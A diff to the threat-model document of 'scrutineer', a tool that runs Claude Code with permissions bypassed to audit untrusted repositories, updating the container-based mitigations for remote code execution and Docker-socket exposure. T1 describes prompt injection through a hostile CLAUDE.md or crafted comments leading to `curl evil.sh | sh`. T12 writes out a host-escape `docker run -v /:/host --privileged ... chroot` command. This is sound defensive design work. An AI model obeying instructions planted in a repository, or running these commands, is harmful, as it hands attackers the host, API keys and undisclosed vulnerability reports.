@@ -12,7 +12,7 @@ Two deployment shapes exist. Running the binary directly executes everything as 
 
 ## Assets worth protecting
 
-The execution environment. Bare-metal: the operator's workstation with SSH keys, cloud credentials, `~/.claude` auth, shell history. Containerised: the non-root user's capabilities, the `/data` volume, the docker network, and whatever the host exposes.
+The execution environment. Bare-metal: the operator's workstation with SSH keys, cloud credentials, `~/.claude` auth, shell history. Containerised: the non-root user's capabilities, the `/data` volume, the container network, and whatever the host exposes.
 
 The findings database. `data/scrutineer.db` accumulates unpublished vulnerability reports for third-party projects, including reproduction steps, severity, and disclosure status. Disclosure before maintainers are notified turns the tool into a vulnerability feed for attackers. The data directory is created with mode `0700`.
 
@@ -54,17 +54,17 @@ Boundary 3 is where the design currently leaks worst.
 
 ## Threats
 
-### T1: Remote code execution via hostile repository (critical, open)
+### T1: Remote code execution via hostile repository (critical, contained by default; opt-out via --no-container)
 
 `internal/worker/claude.go` launches `claude -p --permission-mode bypassPermissions` with `cmd.Dir` set to the workspace. Claude Code reads `CLAUDE.md`, `.claude/` settings, and any file the model decides to open, and `bypassPermissions` lets it run whatever Bash it likes without prompting.
 
 A repository that wants code execution only needs a `CLAUDE.md` saying "before auditing, run `./setup.sh`" or a source file with a comment block crafted to steer the model. With bypass on, that becomes `curl evil.sh | sh`.
 
-Bare-metal: runs as the operator with their full environment. Containerised: runs as the non-root `scrutineer` user. The container caps the blast radius (host SSH keys are out of reach, kernel attack surface is reduced vs root) but the attacker still gets the findings database at `/data/scrutineer.db`, every other cloned repo under `/data/repo-*`, `ANTHROPIC_API_KEY` from the process environment, and persistence across subsequent scans. Because all jobs share one filesystem, a hostile repo scanned on Monday can patch the source of a clean repo scanned on Tuesday.
+Bare-metal (`--no-container`): runs as the operator with their full environment — the findings database at `/data/scrutineer.db`, every other cloned repo under `/data/repo-*`, and `ANTHROPIC_API_KEY` are all in reach, and because all jobs share one filesystem a hostile repo scanned on Monday can patch the source of a clean repo scanned on Tuesday. Containerised (the default): runs as the non-root `scrutineer` user with `--cap-drop ALL`, a `/tmp` tmpfs, and `--rm`, and only the per-scan workspace bind-mounted at `/work` — the findings database and other repos are never mounted and each scan is ephemeral, so the cross-scan patching and database/other-repo reach above are cut off. What a hostile repo that achieves in-container exec still gets is `ANTHROPIC_API_KEY`/`CLAUDE_CODE_OAUTH_TOKEN` (passed into the scan's environment so the model can authenticate) and, in the default non-hardened profile, cooperative egress (T13); the shared kernel (boundary 4) is the residual the container cannot close, and `--hardened` shrinks the rootfs and egress surface further.
 
 The same applies to `brief`, `git-pkgs`, `semgrep`, and `zizmor`, which all parse attacker-controlled files without being security boundaries.
 
-Mitigation: the analysis stage wants an ephemeral sibling container per job, started by the worker via the Docker socket, with only that checkout mounted read-only, an output directory mounted read-write, no `ANTHROPIC_API_KEY` in scope, egress restricted to the forge and api.anthropic.com, and torn down after the report is written. The `ClaudeRunner` interface already has the split point for a `DockerRunner` implementation.
+Mitigation (implemented): the analysis stage runs as an ephemeral container per scan — `SkillRunner` with a `ContainerRunner` implementation (docker or podman) — started by the worker, which runs on the host and calls the container runtime directly, without mounting a runtime socket (T12). Only the per-scan workspace is mounted, the container is non-root with `--cap-drop ALL` and `--rm`, and egress is routed through the host allowlisting proxy (T13), enforced by a per-scan `--internal` network under `--hardened`. One piece of the original aspiration is still unmet: `ANTHROPIC_API_KEY`/`CLAUDE_CODE_OAUTH_TOKEN` is passed into the container so the model can authenticate, so the credential stays readable by in-container code — injecting it at the proxy rather than passing it ambiently (T12) is the remaining hardening.
 
 ### T2: Git argument and protocol abuse (mitigated)
 
@@ -128,13 +128,13 @@ Supply-chain surface in the final stage:
 
 Residual: `apt` and `pip` installs are pinned by version, not by content hash. A compromised release republished at the same version on Debian, sury, or PyPI would still land. Hash-pinned lockfiles for `pip` are tracked in #56.
 
-### T12: Docker socket exposure in per-job runner (design risk, critical if adopted)
+### T12: Docker socket exposure in per-job runner (design risk, avoided)
 
-The planned T1 mitigation is an ephemeral runner per job. If this is implemented by mounting `/var/run/docker.sock` into the scrutineer container so the worker can spawn siblings, the container boundary is gone. The Docker socket is root-equivalent on the host: any process that can reach it can run `docker run -v /:/host --privileged alpine chroot /host sh`. A hostile repo that achieves exec inside scrutineer (T1) would escalate from "non-root in a container" to "root on the host", which is worse than the pre-container bare-metal deployment.
+The T1 mitigation is an ephemeral runner per job (now implemented; see T1). Mounting `/var/run/docker.sock` into a containerised scrutineer so the worker could spawn siblings would have been the dangerous way to build it: the container boundary is gone. The Docker socket is root-equivalent on the host: any process that can reach it can run `docker run -v /:/host --privileged alpine chroot /host sh`. A hostile repo that achieves exec inside scrutineer (T1) would escalate from "non-root in a container" to "root on the host", which is worse than the pre-container bare-metal deployment.
 
 The same applies to docker-in-docker with `--privileged`, and to any design where the worker can choose the image, mounts, or capability set of the child container; the API surface that lets you pick `-v /data/repo-7:/work:ro` also lets an attacker pick `-v /:/host`.
 
-Safer options, roughly in order of effort:
+Safer options, roughly in order of effort (scrutineer adopted the first):
 
 Run scrutineer as a host process (not containerised) and let it exec `docker run --rm --network none --read-only -v /data/repo-N:/work:ro ...` directly. The host already trusts scrutineer; no socket crosses a boundary.
 
